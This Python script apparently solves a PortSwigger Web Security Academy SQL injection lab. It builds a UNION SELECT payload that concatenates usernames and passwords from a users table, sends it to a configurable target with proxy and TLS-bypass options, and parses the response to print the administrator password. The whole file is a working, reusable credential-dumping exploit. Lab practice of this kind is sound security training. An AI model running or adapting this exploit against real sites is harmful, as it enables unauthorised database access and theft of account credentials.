# src/sqli/lab05.py
from __future__ import annotations

import argparse
import sys
from typing import Final

from bs4 import BeautifulSoup

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SQLi Lab05: Extract administrator password via UNION-based injection."
    )

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")

    # injection configuration
    _ = p.add_argument("--endpoint", default="/filter", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument(
        "--param-name", default="category", help="Parameter name (default: %(default)s)"
    )
    _ = p.add_argument(
        "--base-value", default="Gifts", help="Benign base value (default: %(default)s)"
    )
    _ = p.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="GET",
        help="HTTP method (default: %(default)s)",
    )
    _ = p.add_argument(
        "--inject",
        choices=["query", "body"],
        default="query",
        help="Where to inject payload (default: %(default)s)",
    )

    # payload customization
    _ = p.add_argument(
        "--columns",
        type=int,
        default=3,
        help="Total number of columns from previous lab (default: %(default)s)",
    )
    _ = p.add_argument(
        "--string-col",
        type=int,
        default=2,
        help="Index (1-based) of the column that renders text (default: %(default)s)",
    )
    _ = p.add_argument(
        "--username",
        default="administrator",
        help="Target username to search for in results (default: %(default)s)",
    )

    # plumbing
    _ = p.add_argument(
        "--proxy", default=None, help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)"
    )
    _ = p.add_argument(
        "--insecure", action="store_true", help="Disable TLS verification (useful with Burp)."
    )
    _ = p.add_argument(
        "--timeout", type=float, default=10.0, help="HTTP timeout in seconds (default: %(default)s)"
    )

    # optional extras
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")
    _ = p.add_argument(
        "--base-param",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Additional baseline params (repeatable). Applies to query/body.",
    )

    return p.parse_args(argv)


def extract_admin_password(html: str, username: str) -> str | None:
    """Extract the administrator password from an HTML table."""
    soup = BeautifulSoup(html, "html.parser")
    node = soup.find(string=username)
    if not node:
        return None

    td = node.find_parent("td")
    if not td:
        return None
    next_td = td.find_next_sibling("td")
    if not next_td or not next_td.text:
        return None

    return next_td.text.strip()


def exploit_users_table(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    columns: int,
    string_col: int,
    username: str,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
) -> str | None:
    """
    Perform UNION-based injection to dump usernames and passwords,
    and return the admin password if found.
    """
    # Construct UNION SELECT payload dynamically
    select_parts = ["NULL"] * columns
    # Place username and password columns in the string-rendering slot(s)
    select_parts[string_col - 1] = "username || ':' || password"

    union_clause = ", ".join(select_parts)
    payload = f"{base_value}' UNION SELECT {union_clause} FROM users-- -"

    res = sqli_inject(
        client,
        payload=payload,
        method=method,
        endpoint=endpoint,
        inject=inject,
        param_name=param_name,
        base_params=base_params,
        extra_headers=headers,
        cookies=cookies,
        success_marker=username,  # succeed if 'administrator' shows up
    )

    if not res.success:
        return None

    return extract_admin_password(res.evidence_excerpt, username) or None


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    cookies = parse_keyvals(args.cookie, "=")
    headers = parse_keyvals(args.header, ":")
    base_params = parse_keyvals(args.base_param, "=")

    print("[+] Dumping the list of usernames and passwords via UNION SELECT...")

    try:
        admin_password = exploit_users_table(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            columns=args.columns,
            string_col=args.string_col,
            username=args.username,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
        )
    except Exception as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if admin_password:
        print(f"[+] Found administrator password: {admin_password}")
        return 0
    else:
        print("[-] Did not find administrator password.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage example
# python -m src.sqli.lab05 \
# https://TARGET.web-security-academy.net \
# --endpoint /filter \
# --param-name category \
# --base-value Gifts \
# --columns 3 \
# --string-col 2 \
# --proxy http://127.0.0.1:8080 \
# --insecure
